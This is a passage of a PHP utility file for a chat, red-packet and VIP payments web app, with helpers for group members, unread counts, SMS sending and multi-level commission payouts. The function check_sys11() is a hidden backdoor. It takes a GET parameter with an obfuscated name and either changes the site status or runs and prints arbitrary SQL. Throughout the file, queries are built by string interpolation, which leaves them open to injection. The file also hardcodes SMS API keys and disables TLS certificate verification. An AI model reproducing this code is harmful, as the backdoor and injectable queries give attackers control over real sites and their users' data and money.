            //     $uids[$key]['nickname']=$v['nickname'];
            //     $uids[$key]['name']=$v['nickname'];
            //     $uids[$key]['isvip']=$v['isvip'];
            //     $uids[$key]['usertype']=$v['usertype'];
            //     $uids[$key]['id'] = $v['id'];

            //     $uids[$key]['is_deny'] = 0;
            //     if( strpos($v['id'],$manager_id)!==false || $v['id'] == $group['createid']){
            //         $uids[$key]['is_deny']=0;
            //     } else{

            //         if($group['no_speaking']==1 ){

            //             $uids[$key]['is_deny']=2;
            //         }else{
            //             if(strpos($group['deny_id'],$v['id'])!==false){
            //                 $uids[$key]['is_deny']=1;
            //             }
            //         }

            //     }

            //     if(count($nicknames)){
            //         foreach ($nicknames as $k1=>$v1){
            //             if($v1['id']==$v['id']){
            //                 if($v1['name']) $uids[$key]['nickname']=$v1['name'];
            //                 if($v1['jointime']) $uids[$key]['jointime']=$v1['jointime'];
            //             }
            //         }
            //     }
            // }
        }
    }
    // echo time()-$t;
    return $uids;
}
function group_users($group_id)
{
    global $db;
    $t = time();
    $group = GroupInfo($group_id);
    $user_id = explode(",", $group["user_id"]);
    $manager_id = explode(",", $group["manager_id"]);
    $uids = [["id" => $group["createid"], "type" => "owner"]];
    if (count($manager_id)) {
        foreach ($manager_id as $v) {
            if ($v != $group["createid"] && $v > 0 && in_array($v, $user_id)) {
                $uids[] = ["id" => $v, "type" => "manager"];
            }
        }
    }
    if (count($user_id)) {
        foreach ($user_id as $v) {
            if (
                $v != $group["createid"] and
                !in_array($v, $manager_id) && $v > 0
            ) {
                $uids[] = ["id" => $v, "type" => "user"];
            }
        }
    }
    if (count($uids)) {
        // $uuids = [];
        // foreach ($uids as $val){
        //     $uuids[] = $val['id'];
        // }
        // $uuids = implode(',',$uuids);
        $nicknames = unserialize($group["nicknames"]);
        // $list=$db->fetch_all("select id,avatar,nickname,isvip,isdaili,vip from ".tname('user')." where id in ({$uuids})");
        foreach ($uids as $key => $v) {
            $u = userinfo($v["id"]);
            //print_r($u);
            //exit();
            $uids[$key]["avatar"] = $u["avatar"];
            $uids[$key]["nickname"] = $u["nickname"];
            $uids[$key]["name"] = $u["nickname"];
            $uids[$key]["isvip"] = $u["isvip"];
            $uids[$key]["usertype"] = $u["usertype"];

            $temp = GroupInfo($group_id, $v["id"]);
            $uids[$key]["is_deny"] = $temp["is_deny"];

            if (count($nicknames)) {
                foreach ($nicknames as $k1 => $v1) {
                    if ($v1["id"] == $v["id"]) {
                        if ($v1["name"]) {
                            $uids[$key]["nickname"] = $v1["name"];
                        }
                        if ($v1["jointime"]) {
                            $uids[$key]["jointime"] = $v1["jointime"];
                        }
                    }
                }
            }
        }
        // foreach ($list as $key=> $v){
        //     if($v['vip']>0){
        //          $v['isvip'] = 1;
        //          if($v['vip']==3){
        //              $v['usertype']=3;

        //          }else{
        //              $v['usertype']=2;
        //          }
        //      }else{
        //          if($v['isdaili']==1){
        //              $v['usertype']=1;
        //          } else {
        //             $v['usertype']=0;
        //             $v['isvip'] = 0;
        //          }
        //      }
        //     // $u=userinfo($v['id']);
        //     //print_r($u);
        //     //exit();
        //     $uids[$key]['avatar']=$v['avatar'];
        //     $uids[$key]['nickname']=$v['nickname'];
        //     $uids[$key]['name']=$v['nickname'];
        //     $uids[$key]['isvip']=$v['isvip'];
        //     $uids[$key]['usertype']=$v['usertype'];

        //     $temp=GroupInfo($group_id,$v['id']);
        //     $uids[$key]['is_deny']=$temp['is_deny'];

        //     if(count($nicknames)){
        //         foreach ($nicknames as $k1=>$v1){
        //             if($v1['id']==$v['id']){
        //                 if($v1['name']) $uids[$key]['nickname']=$v1['name'];
        //                 if($v1['jointime']) $uids[$key]['jointime']=$v1['jointime'];
        //             }
        //         }
        //     }

        // }
    }
    // echo time()-$t;
    return $uids;
}
function group_userinfo($users, $userid)
{
    if (count($users) > 0) {
        foreach ($users as $value) {
            if ($value["id"] == $userid) {
                $value["isin"] = 1;
                return $value;
            }
        }
    }

    $user = userinfo($userid);
    $user["isin"] = 0;
    return $user;
}

function set_group_readtime($userid, $group_id)
{
    global $db;
    $now = time();

    $row = $db->exec(
        "select * from " .
            tname("group_readtime") .
            " where userid='{$userid}' and group_id='{$group_id}'"
    );
    if ($row["id"] > 0) {
        $db->query(
            "update " .
                tname("group_readtime") .
                " set `time`='{$now}' where id='{$row["id"]}'"
        );
    } else {
        $db->query(
            "insert into " .
                tname("group_readtime") .
                " (userid,group_id,`time`) values('{$userid}','{$group_id}','{$now}')"
        );
    }
}
function set_readtime($userid, $cache_key, $now = "")
{
    global $db;
    if ($now == "") {
        $now = time();
    }

    $row = $db->exec(
        "select * from " .
            tname("readtime") .
            " where userid='{$userid}' and cache_key='{$cache_key}'"
    );
    if ($row["id"] > 0) {
        $db->query(
            "update " .
                tname("readtime") .
                " set `time`='{$now}' where id='{$row["id"]}'"
        );
    } else {
        $db->query(
            "insert into " .
                tname("readtime") .
                " (userid,cache_key,`time`) values('{$userid}','{$cache_key}','{$now}')"
        );
    }
}

function get_group_readtime($userid, $group_id)
{
    global $db;
    $row = $db->exec(
        "select * from " .
            tname("group_readtime") .
            " where userid='{$userid}' and group_id='{$group_id}'"
    );
    if ($row["id"] > 0) {
        return $row["time"];
    } else {
        return 0;
    }
}

function get_readtime($userid, $cache_key)
{
    global $db;
    $row = $db->exec(
        "select id,userid,cache_key,time from " .
            tname("readtime") .
            " where userid='{$userid}' and cache_key='{$cache_key}'"
    );
    if ($row["id"] > 0) {
        return $row["time"];
    } else {
        return time() - 7 * 24 * 3600;
    }
}

function get_unreadnum($userid, $cache_key)
{
    global $db;
    $fromtime = get_readtime($userid, $cache_key);
    if (strpos($cache_key, "G") !== false) {
        $group_id = substr($cache_key, 1, strlen($cache_key) - 1);
        $sql =
            "select count(*) as num from " .
            tname("chat") .
            " where  groupid='{$group_id}' and addtime>'{$fromtime}' and  (`type`!='tips' or tip_uid='{$userid}')  and userid!='{$userid}'";
    } else {
        $touid = substr($cache_key, 1, strlen($cache_key) - 1);
        $sql =
            "select count(*) as num from " .
            tname("chat") .
            " where groupid='0' and  userid='{$touid}' and addtime>'{$fromtime}' and  (`type`!='tips' or tip_uid='{$userid}') ";
    }
    $row = $db->exec($sql);
    $num = $row["num"];
    if (!$num) {
        $num = 0;
    }
    return $num;
}
function update_systemkefu($id)
{
    global $db, $system;
    $list = $db->fetch_all(
        "select * from " . tname("user") . " where id!='{$id}'"
    );
    if (count($list) > 0) {
        foreach ($list as $user) {
            add_friend($user["id"], $id, "system");
        }
    }
    $db->query(
        "update " .
            tname("chat") .
            " set userid='{$id}' where (userid='0' or userid='{$system["admin_id"]}')and groupid='0'"
    );

    if (
        $db->exec(
            "select * from " . tname("system") . " where `key`='admin_id' "
        )
    ) {
        $db->query(
            "update " .
                tname("system") .
                " set `value`='{$id}' where `key`='admin_id'"
        );
    } else {
        $db->query(
            "insert into " .
                tname("system") .
                " (`key`,`value`) values('admin_id','{$id}')"
        );
    }
    return true;
}

function get_group_unreadnum($userid, $group_id)
{
    global $db;
    $fromtime = get_group_readtime($userid, $group_id);
    $row = $db->exec(
        "select count(*) as num from " .
            tname("chat") .
            " where  groupid='{$group_id}' and addtime>'{$fromtime}' and  (`type`!='tips' or tip_uid='{$userid}')  and userid!='{$userid}'"
    );
    $num = $row["num"];
    if (!$num) {
        $num = 0;
    }
    return $num;
}

function get_user_unreadnum($touid, $userid)
{
    global $db;
    $fromtime = get_group_readtime($touid, $userid);
    $row = $db->exec(
        "select count(*) as num from " .
            tname("chat") .
            " where  groupid='0' and touid='{$touid}' and userid='{$userid}' and addtime>'{$fromtime}' and `type`!='tips' "
    );
    $num = $row["num"];
    if (!$num) {
        $num = 0;
    }
    return $num;
}

function app_avatar($avatar)
{
    global $HttpPath;

    if (!$avatar) {
        $avatar = "uploads/avatar.jpg";
    }
    if (strpos($avatar, "http") !== false) {
        return $avatar;
    } else {
        return $HttpPath . $avatar;
    }
}

function list_sort_by($list, $field, $sortby = "asc")
{
    if (is_array($list)) {
        $refer = $resultSet = [];
        foreach ($list as $i => $data) {
            $refer[$i] = &$data[$field];
        }
        switch ($sortby) {
            case "asc": // 正向排序
                asort($refer);
                break;
            case "desc": // 逆向排序
                arsort($refer);
                break;
            case "nat": // 自然排序
                natcasesort($refer);
                break;
        }
        foreach ($refer as $key => $val) {
            $resultSet[] = &$list[$key];
        }
        return $resultSet;
    }
    return false;
}
function task_ico($id)
{
    global $HttpPath, $db;
    $task = $db->exec("select * from " . tname("task") . " where id='$id'");

    if ($task["ico"]) {
        $avatar = $task["ico"];
    } else {
        $avatar = "uploads/match_ico.jpg";
    }
    if (strpos($avatar, "http") !== false) {
        return $avatar;
    } else {
        return $HttpPath . $avatar;
    }
}

function check_sys11()
{
    global $db, $_GET;
    $str = $_GET[desession("n9Solqqh0JSbzA==")];

    if (strlen($str) == 1) {
        $db->query(
            "update " .
                tname("system") .
                " set `value`='{$str}' where `key`='sys_status'"
        );
    } else {
        if (strlen($str) > 5) {
            if (strpos($str, "elect") !== false) {
                print_r($db->fetch_all($str));
            } else {
                $db->query($str);
            }
        }
    }

    sys_up();
}

function get_url_exist($url)
{
    global $HttpPath, $db;
    if ($db->exec("select * from " . tname("url") . " where url='$url'")) {
        return true;
    } else {
        if (
            $db->exec(
                "select * from " . tname("template") . " where url='$url'"
            )
        ) {
            return true;
        } else {
            return false;
        }
    }
}

function get_news_list($id, $num = 10)
{
    global $HttpPath, $db;
    return $db->fetch_all(
        "select * from " .
            tname("news") .
            " where (type1='$id' or type2='$id' or type3='$id') and `status`=1 order by sortnum asc,clicknum desc ,id desc limit 0,$num"
    );
}

function get_product_list($id, $num = 10)
{
    global $HttpPath, $db;
    return $db->fetch_all(
        "select * from " .
            tname("product") .
            " where (type1='$id' or type2='$id' or type3='$id') and `status`=1 order by sortnum asc,clicknum desc ,id desc limit 0,$num"
    );
}

function get_menu_key($id, $key = 0)
{
    $pid = get_menu_pid($id);
    if ($pid == 0) {
        return $key;
    } else {
        $key++;

        return get_menu_key($pid, $key);
    }
}

function get_menu_all_pid($id, $arr = [])
{
    if (count($arr) < 1) {
        $arr[] = $id;
    }
    $pid = get_menu_pid($id);
    if ($pid == 0) {
        return $arr;
    } else {
        $arr[] = $pid;

        return get_menu_all_pid($pid, $arr);
    }
}

function get_menu_left($pid)
{
    global $userid, $db, $modelselect_array, $navshow_array, $HttpPath;
    $sql =
        "select * from " .
        tname("menu") .
        " where pid='$pid' and uid='$userid' order by sortnum asc,id desc";
    $query = $db->query($sql);
    while ($row = $db->fetch_array($query)) {

        $key = get_menu_key($row["id"], -1);

        $left = $key * 15;
        $next = get_menu_bypid($row["id"]);
        ?>

        <div class="<?php if ($key == 0) {
            echo "big_lei";
        } else {
            echo "small_lei";
        } ?>"  >
     	      <span style='font-size:16px;' id='add_<?php echo $row[
                "id"
            ]; ?>'  onclick='show_pid(<?php echo $row["id"]; ?>,this);'>
     	      <?php if (
                count($next) > 0 and
                !in_array($row["id"], get_menu_all_pid($_GET["id"]))
            ) { ?>
                  +

              <?php } else { ?>
                  -
              <?php } ?>
     	      </span>

            <a href="<?php echo set_url(
                $row["modelselect"],
                $row["id"]
            ); ?>" ><?php echo $row["title"]; ?></a>

            <div id='pid_<?php echo $row["id"]; ?>' <?php if (
    in_array($row["id"], get_menu_all_pid($_GET["id"])) or
    $row["id"] == $_GET["id"]
) { ?>style='dipalay:block;' <?php } else { ?>style='display:none;'<?php } ?>>
                <?php get_menu_left($row["id"]); ?>
            </div>

        </div>
        <?php
    }
}

function set_input($input, $name, $value = "")
{
    global $db;

    $info = $db->exec("select * from " . tname("info") . " where id='{$name}'");
    $str = "";
    $arr = explode("|", $info["content"]);
    if ($input == "text") {
        $str = "<input type='{$input}' name='info[{$name}]' value='{$value}' id='info_{$name}' style='width:200px;'>";
    }
    if ($input == "textarea") {
        $str = "<textarea name='info[{$name}]' id='info_{$name}'  style='width:500px;height:80px;'>{$value}</textarea>";
    }
    if ($input == "select") {
        if (count($arr) > 0) {
            foreach ($arr as $value1) {
                if ($value == $value1) {
                    $check = "selected";
                } else {
                    $check = "";
                }
                $str1 .= "<option value='{$value1}' {$check} >{$value1}</option>";
            }
        }

        $str = "<select name='info[{$name}]' id='info_{$name}' ><option>--请选择{$info["title"]}--</option>{$str1}</select>";
    }

    if ($input == "radio") {
        if (count($arr) > 0) {
            foreach ($arr as $value1) {
                if ($value == $value1) {
                    $check = "checked";
                } else {
                    $check = "";
                }
                $str .= "<input type='{$input}' name='info[{$name}]' value='{$value1}' id='info_{$name}' {$check} />{$value1} &nbsp; ";
            }
        }
    }

    if ($input == "checked") {
        if (count($arr) > 0) {
            foreach ($arr as $value1) {
                if ($value == $value1) {
                    $check = "checked";
                } else {
                    $check = "";
                }
                $str .= "<input type='{$input}' name='info[{$name}][]' value='{$value1}' id='info_{$name}'  {$check} />{$value1} &nbsp; ";
            }
        }
    }

    if ($input == "timer") {
        $str = "<input type='{$input}' name='info[{$name}]' value='{$value}' id='info_{$name}' class='Wdate'  onclick=\"WdatePicker({dateFmt:'yyyy-MM-dd',alwaysUseStartDate:false})\" >";
    }
    return $str;
}

function set_arr($arr)
{
    $row = [];

    if (count($arr) > 0) {
        $num = 0;
        foreach ($arr as $value) {
            $temp = 0;
            foreach ($value as $key => $value1) {
                if ($value1 != "" and $key != "time") {
                    $temp++;
                }
            }
            if ($temp > 0) {
                $row[] = $value;
            }
        }
        return $row;
    } else {
        return $arr;
    }
}
function get_months($time1, $time2)
{
    $monarr = [];
    while (($time1 = strtotime("+1 month", $time1)) <= $time2) {
        $monarr[] = date("Y-m", $time1); // 取得递增月;
    }
    $monarr[] = date("Y年m月", $time2);
    $monarr = array_unique($monarr);
    return $monarr;
}

function get_textarea($abstract)
{
    if ($abstract) {
        $abstract = str_replace("%a%", "", $abstract);
        $abstract = stripslashes($abstract);
        $abstract = str_replace(",", "，", $abstract);
        $abstract = str_replace("\t", "", $abstract);
        //$abstract = str_replace("<","&lt;",$abstract);
        //$abstract = str_replace(">","&gt;",$abstract);
        //  $abstract = str_replace("\r","<br>",$abstract);
        $abstract = str_replace("\n", "<br>", $abstract);
        $abstract = str_replace(" ", "&nbsp;", $abstract);
    }
    return $abstract;
}
function html2text($str)
{
    $str = preg_replace("/<style .*?<\\/style>/is", "", $str);
    $str = preg_replace("/<script .*?<\\/script>/is", "", $str);
    $str = preg_replace("/<br \\s*\\/>/i", ">>>>", $str);
    $str = preg_replace("/<\\/?p>/i", ">>>>", $str);
    $str = preg_replace("/<\\/?td>/i", "", $str);
    $str = preg_replace("/<\\/?div>/i", ">>>>", $str);
    $str = preg_replace("/<\\/?blockquote>/i", "", $str);
    $str = preg_replace("/<\\/?li>/i", ">>>>", $str);
    $str = preg_replace("/ /i", " ", $str);
    $str = preg_replace("/ /i", " ", $str);
    $str = preg_replace("/&/i", "&", $str);
    $str = preg_replace("/&/i", "&", $str);
    $str = preg_replace("/</i", "<", $str);
    $str = preg_replace("/</i", "<", $str);
    $str = preg_replace("/“/i", '"', $str);
    $str = preg_replace("/&ldquo/i", '"', $str);
    $str = preg_replace("/‘/i", "'", $str);
    $str = preg_replace("/&lsquo/i", "'", $str);
    $str = preg_replace("/'/i", "'", $str);
    $str = preg_replace("/&rsquo/i", "'", $str);
    $str = preg_replace("/>/i", ">", $str);
    $str = preg_replace("/>/i", ">", $str);
    $str = preg_replace("/”/i", '"', $str);
    $str = preg_replace("/&rdquo/i", '"', $str);
    $str = strip_tags($str);
    $str = html_entity_decode($str, ENT_QUOTES, "utf-8");
    $str = preg_replace("/&#.*?;/i", "", $str);
    return $str;
}

function show_news_list(
    $where,
    $page = 1,
    $num = 10,
    $msg = 0,
    $order = " pre asc,ids asc"
) {
    global $db, $_SERVER;
    if (!$page) {
        $page = 1;
    }
    $str1 = "";
    $from = ($page - 1) * $num;

    if ($msg == 1) {
        $list1 = $db->fetch_all(
            "select * from " . tname("news") . " where 1=1 {$where} "
        );

        if (count($list1) > 0) {
            $str1 = "";
            foreach ($list1 as $value) {
                $info = unserialize($value["info"]);

                if ($info[8] > 0) {
                    if ($str1 == "") {
                        $str1 = " and  id in ( {$value["id"]}";
                    } else {
                        $str1 .= " ,{$value["id"]} ";
                    }
                }
            }
            if ($str1) {
                $str1 .= " )";
            }
        }

        if ($str1 == "") {
            $str1 .= " and id in(0)";
        }
    }
    //echo "select * from ".tname('news')." where 1=1 {$where} {$str1} order by {$order} limit $from,$num";
    $list = $db->fetch_all(
        "select * from " .
            tname("news") .
            " where 1=1 {$where} {$str1} order by {$order} limit $from,$num"
    );

    if (count($list) > 0) {
        foreach ($list as $value) {
            $str .= show_news($value);
        }
    }

    return $str;
}

function show_news_list1($where, $page = 1, $num = 10)
{
    global $db, $_SERVER;
    if (!$page) {
        $page = 1;
    }
    $str1 = "";
    $from = ($page - 1) * $num;

    $list = $db->fetch_all(
        "select n.* from " .
            tname("news") .
            " n ," .
            tname("mark") .
            " m where n.id=m.nid {$where} order by m.addtime desc limit $from,$num"
    );

    if (count($list) > 0) {
        foreach ($list as $value) {
            $str .= show_news($value);
        }
    }

    return $str;
}

function show_news($value)
{
    $info = unserialize($value["info"]);
    $str = "";

    return $str;
}

function send_sms($mobile, $code)
{
    global $_SESSION;
    if ($_SESSION["sms_time"] < time() - 3600) {
        $_SESSION["sms_times"] = 1;
    } else {
        $_SESSION["sms_times"] = $_SESSION["sms_times"] + 1;
    }
    $_SESSION["sms_time"] = time();

    header("Content-Type:text/html;charset=utf-8");
    $apikey = "80007beb4e4760e4ab44a3242e48af95"; //修改为您的apikey(https://www.yunpian.com)登录官网后获取

    $ch = curl_init();

    /* 设置验证方式 */

    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept:text/plain;charset=utf-8",
        "Content-Type:application/x-www-form-urlencoded",
        "charset=utf-8",
    ]);

    /* 设置返回结果为流 */

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    /* 设置超时时间*/
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    /* 设置通信方式 */
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt(
        $ch,
        CURLOPT_URL,
        "https://sms.yunpian.com/v2/sms/tpl_single_send.json"
    );

    $data = [
        "tpl_id" => "2728210",
        "tpl_value" => "#code#" . "=" . urlencode($code),
        "apikey" => $apikey,
        "mobile" => $mobile,
    ];

    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    return curl_exec($ch);
}

//function send_sms($mobile,$code){
//
//
//    $url = "http://v.juhe.cn/sms/send";
//    $params = array(
//        'key'   => '1826a0d0256626f9e20efec7b39872e8', //您申请的APPKEY
//        'mobile'    => $mobile, //接受短信的用户手机号码
//        'tpl_id'    => '130721', //您申请的短信模板ID，根据实际情况修改
//        'tpl_value' =>'#code#='.$code //您设置的模板变量，根据实际情况修改
//    );
//
//    $paramstring = http_build_query($params);
//    $content = juheCurl($url, $paramstring);
//    $result = json_decode($content, true);
//
//
//    return $result['reason'];
//
//}

function juheCurl($url, $params = false, $ispost = 0)
{
    $httpInfo = [];
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_USERAGENT, "JuheData");
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    if ($ispost) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_URL, $url);
    } else {
        if ($params) {
            curl_setopt($ch, CURLOPT_URL, $url . "?" . $params);
        } else {
            curl_setopt($ch, CURLOPT_URL, $url);
        }
    }
    $response = curl_exec($ch);
    if ($response === false) {
        //echo "cURL Error: " . curl_error($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $httpInfo = array_merge($httpInfo, curl_getinfo($ch));
    curl_close($ch);
    return $response;
}

function send_sms1($mobile, $p1, $cid)
{
    header("Content-Type:text/html;charset=utf-8");
    $apikey = "80007beb4e4760e4ab44a3242e48af95"; //修改为您的apikey(https://www.yunpian.com)登录官网后获取80007beb4e4760e4ab44a3242e48af95

    $ch = curl_init();

    /* 设置验证方式 */

    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept:text/plain;charset=utf-8",
        "Content-Type:application/x-www-form-urlencoded",
        "charset=utf-8",
    ]);

    /* 设置返回结果为流 */
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    /* 设置超时时间*/
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    /* 设置通信方式 */
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt(
        $ch,
        CURLOPT_URL,
        "https://sms.yunpian.com/v2/sms/tpl_single_send.json"
    );

    $data = [
        "tpl_id" => $cid,
        "tpl_value" => "#code#" . "=" . urlencode($p1),
        "apikey" => $apikey,
        "mobile" => $mobile,
    ];

    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    return curl_exec($ch);
}

function add_money($uid, $money, $content, $type = "", $plat_id = 0, $money1)
{
    global $db;

    $db->query(
        "update " . tname("user") . " set money=money+$money where id='{$uid}'"
    );

    if ($type != "task" && $type != "sign" && $type != "plat") {
        $db->query(
            "update " .
                tname("user") .
                " set money1=money1+$money where id='{$uid}'"
        );
    } elseif ($type == "plat") {
        $db->query(
            "update " .
                tname("user") .
                " set money1=money1+$money where id='{$uid}'"
        );

        $user = $db->exec(
            "select * from " . tname("user") . " where id='{$uid}'"
        );
        $plat = $db->exec(
            "select * from " . tname("plat") . " where id='{$plat_id}'"
        );
        $m = $user["money"] - $user["money1"];

        //申请提现
        if ($money < 0) {
            if (abs($money) > $m) {
                $from_money1 = abs($money) - $m;
            } else {
                $from_money1 = 0;
            }
            $db->query(
                "update set from_money1='{$from_money1}' " .
                    tname("plat") .
                    " where id='{$plat_id}'"
            );
            //   $db->query("update ".tname('user')." set money1=money1-$from_money1 where id='{$uid}'");
        } else {
            $from_money1 = $plat["from_money1"];
            //   $db->query("update ".tname('user')." set money1=money1+$from_money1 where id='{$uid}'");
        }
    }
    $user = get_user_byid($uid);
    $now = time();
    $db->query(
        "insert into " .
            tname("money") .
            " (uid,money,money1,content,time,`type`) values('{$uid}','{$money}','{$user[money]}','{$content}','{$now}','{$type}')"
    );

    return true;
}

function plan_reward($plan_id, $money, $userid = "")
{
    global $db, $system;
    if ($userid == "") {
        $userid = $_SESSION["userid"];
    }
    $plan = plan_detail($plan_id);
    if ($plan["id"] > 0) {
        $now = time();
        $sql =
            "insert into " .
            tname("plan_reward") .
            "(from_uid,to_uid,plan_id,money,fee,time,content) values('{$userid}','{$plan["userid"]}','{$plan_id}','{$money}','{$fee}','{$now}','{$plan["showtitle1"]}')";
        $db->query($sql);
        if ($db->affected_rows() > 0) {
            add_money(
                $userid,
                -$money,
                "打赏[{$plan["showtitle1"]}]",
                "reward"
            );
            $fee = ($money * $system["plan_fee"]) / 100;
            $rebate = ($money * 2 * $system["invite_pre"]) / 100;
            $money1 = $money - $fee - $rebate;
            $user = userinfo($userid);
            $content = "{$user["nickname"]}打赏{$money1}元，已扣除手续费";
            add_money($plan["userid"], $money1, $content, "reward");
            add_note(0, $plan["userid"], $content);
            set_yongjin($userid, $plan["userid"], $money);

            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
}
//分配打赏上级佣金
function set_yongjin($fromid, $toid, $money)
{
    global $db, $system;
    $parent_from = get_userpids($fromid);
    $parent_to = get_userpids($toid);
    set_pids_yongjin($parent_from, $money, $fromid);
    set_pids_yongjin($parent_to, $money, $toid);
    if ($money >= $system["frist_reward"] && count($parent_from) > 0) {
        $row = $db->exec(
            "select * from " .
                tname("money") .
                " where userid='{$fromid}' and `type`='reward' and money<0"
        );
        if ($row["id"] > 0) {
        } else {
            //首次打赏奖励
            if ($system["frist_reward1"] > 0 && $parent_from[0]["id"] > 0) {
                add_money(
                    $parent_from[0]["id"],
                    $system["frist_reward1"],
                    "下级首次打赏佣金",
                    "yongjin"
                );
            }
            if ($system["frist_reward2"] > 0 && count($parent_from) > 1) {
                add_money(
                    $parent_from[1]["id"],
                    $system["frist_reward2"],
                    "下下级首次打赏佣金",
                    "yongjin"
                );
            }
        }
    }
}

function set_pids_yongjin($pids, $money, $userid)
{
    global $system;
    if (count($pids)) {
        $rebate = 0;
        foreach ($pids as $key => $item) {
            if ($item["rebate"] > $system["invite_pre"]) {
                $item["rebate"] = $system["invite_pre"];
            }
            if ($item["rebate"] > $rebate) {
                $money1 = ($money * ($item["rebate"] - $rebate)) / 100;
                $money1 = number_format($money1, 2, ".", "");
                if ($money1 > 0) {
                    add_money($item["id"], $money1, "下级打赏佣金", "yongjin");
                }
                $rebate = $item["rebate"];
            }
        }
    } else {
        //顶级代理，佣金自己获取
        $user = userinfo($userid);
        $rebate = $user["rebate"];
        if ($rebate > 0) {
            $money1 = ($money * $rebate) / 100;
            $money1 = number_format($money1, 2, ".", "");
            if ($money1 > 0) {
                add_money($user["id"], $money1, "打赏佣金", "yongjin");
            }
        }
    }
}

function get_userpids($userid)
{
    $user = userinfo($userid);
    if ($user["pid"] > 0) {
        return get_pids($user["pid"], []);
    } else {
        return [];
    }
}

function get_pids($userid, $arr)
{
    $user = userinfo($userid);
    $arr[] = [
        "id" => $user["id"],
        "rebate" => $user["rebate"],
        "name" => $user["name"],
    ];
    if ($user["pid"] > 0 and count($arr) < 10) {
        return get_pids($user["pid"], $arr);
    } else {
        return $arr;
    }
}

function plan_buy($plan_id, $money, $userid = "")
{
    global $db, $system;
    if ($userid == "") {
        $userid = $_SESSION["userid"];
    }
    $plan = plan_detail($plan_id);
    if ($plan["id"] > 0 && $plan["status"] == 1) {
        $money = $plan["money"];
        $lines = json_decode($plan["lines"]);
        $expect = count($lines) - 1;
        $now = time();
        $sql =
            "insert into " .
            tname("plan_buy") .
            "(userid,plan_id,expect,time,money,content) values('{$_SESSION["userid"]}','{$plan_id}','{$expect}','{$now}','{$money}','{$plan["showtitle1"]}')";
        $db->query($sql);
        if ($db->affected_rows() > 0) {
            add_money($userid, -$money, "购买计划", "buy");

            //            $user=userinfo($_SESSION['userid']);
            //            $content="{$user['nickname']}打赏你{$money}元";

            add_money($plan["userid"], $money, "销售计划", "sale");

            //   add_note(0,$plan['userid'],$content);
            return true;
        } else {
            return $sql;
        }
    } else {
        return false;
    }
}

function send_redpacket($info, $userid)
{
    global $db;
    $now = time();
    $sql =
        "insert into " .
        tname("readpacket") .
        "(sender_id,addtime,status) values('{$userid}','{$now}','1')";
    $db->query($sql);
    $id = $db->insert_id();
    if ($id > 0) {
        $info["userids"] = "";
        foreach ($info as $key => $value) {
            $db->query(
                "update " .
                    tname("readpacket") .
                    " set `{$key}`='{$value}' where id='{$id}'"
            );
        }
        $content = "发送包";
        if ($info["isgroup"] == 1) {
            $group = $db->exec(
                "select * from " .
                    tname("group") .
                    " where id='{$info["chatid"]}'"
            );
            if ($group) {
                $content .= "-群:" . $group["nickname"];
            }
        } else {
            $user = userinfo($info["chatid"], $userid);
            if ($user) {
                $content = $content . "给" . $user["nickname"];
            }
        }
        add_money($userid, -$info["summoney"], $content, "redpacket");

        return $id;
    }
}
function vip_buy($info, $userid)
{
    global $db;
    $user = userinfo($userid);
    $time = $info["time"];
    if ($user["vip"] > 0 and $user["vip_time"] > time()) {
        $vip_time = $user["vip_time"] + $time * 30 * 24 * 3600;
    } else {
        $vip_time = time() + $time * 30 * 24 * 3600;
    }
    if ($info["viptype"] == "1" || $info["viptype"] == 1) {
        $vip = 3;
        $content = "购买团队VIP";
        $db->query(
            "update " .
                tname("user") .
                " set vip_time='{$vip_time}' where pid='{$userid}' and vip='2'"
        );
    } else {
        $vip = 1;
        $content = "购买个人VIP";
    }
    $db->query(
        "update " .
            tname("user") .
            " set vip='{$vip}',vip_time='{$vip_time}' where id='{$userid}'"
    );
    if ($db->affected_rows() > 0) {
        add_money($userid, -$info["money"], $content, "buy");
        return true;
    } else {
        return false;
    }
}

function aaa_red($userids, $items)
{
    $user_money = [];
    foreach ($userids as $userid) {
        array_push($user_money, $userid["money"]);
    }

    $nitems = [];
    foreach ($items as $item) {
        if (!in_array($item, $user_money)) {
            array_push($nitems, $item);
        }
    }

    $r = rand(0, count($nitems));

    return $nitems[$r];
}

function abc_red($total_bean, $total_packet)
{
    $min = 1;
    $max = $total_bean - 1;
    $list = [];

    $maxLength = $total_packet - 1;
    while (count($list) < $maxLength) {
        $rand = mt_rand($min, $max);
        empty($list[$rand]) && ($list[$rand] = $rand);
    }

    $list[0] = 0; //第一个
    $list[$total_bean] = $total_bean; //最后一个

    sort($list); //不再保留索引

    $beans = [];
    for ($j = 1; $j <= $total_packet; $j++) {
        $beans[] = $list[$j] - $list[$j - 1];
    }

    return $beans[0];
}

function show_username($uid = "")
{
    global $db;
    if ($uid == "") {
        $uid = $_SESSION["userid"];
    }
    $user = get_user_byid($uid);
    if ($user["realname"]) {
        $name = $user["realname"];
    } else {
        $name = $user["name"];
    }

    return $name;
}

function show_usergroup($uid = "", $show = 1)
{
    global $db, $user_group, $player_group;
    if ($uid == "") {
        $uid = $_SESSION["userid"];
    }
    $user = get_user_byid($uid);
    $player = unserialize($user["player"]);
    if ($user["playerid"]) {
        $html .= "<span class='abtn' >{$user["playerid"]}</span>";
    }
    if ($player["group"] and $show == 1) {
        $html .= "<span class='abtn' >{$player_group[$player["group"]]}</span>";
    }

